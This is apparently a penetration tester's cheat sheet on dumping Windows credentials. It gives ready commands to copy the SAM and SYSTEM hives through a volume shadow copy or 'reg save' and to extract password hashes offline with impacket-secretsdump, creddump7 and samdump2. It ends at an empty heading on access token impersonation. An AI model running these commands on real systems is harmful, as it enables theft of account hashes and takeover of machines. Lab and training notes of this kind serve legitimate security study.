# Windows Credentials
# Windows Credentials
## SAM Database
### Backup
| Info | Command |
|:-----|:--------|
| Create a shadow copy of C:\ | `wmic shadowcopy call create Volume='C:\'` |
| Verify the shadow copies | `vssadmin list shadows` |
| Copy SAM file from shadow copy | `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\offsec.corp1\Downloads\sam` |
| Copy System file from shadow copy | `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\offsec.corp1\Downloads\system` |
| Copy SAM file from registry | `reg save HKLM\sam C:\users\offsec.corp1\Downloads\sam` |
| Copy System file from registry | `reg save HKLM\system C:\users\offsec.corp1\Downloads\system` |

### Decrypt
| Info | Command |
|:-----|:--------|
| Install Python-Crypto required for creddump7 | `sudo apt install python-crypto` |
| Download creddump7 | `sudo git clone https://github.com/Neohapsis/creddump7` |
| Decrypt SAM / System files #1 | `impacket-secretsdump -ts local -system system -sam sam` |
| Decrypt SAM / System files | `python pwdump.py /home/kali/system /home/kali/sam` |
| Decrypt SAM / System files | `samdump2 system sam` |



## Access Tokens
### Elevation with impersonation
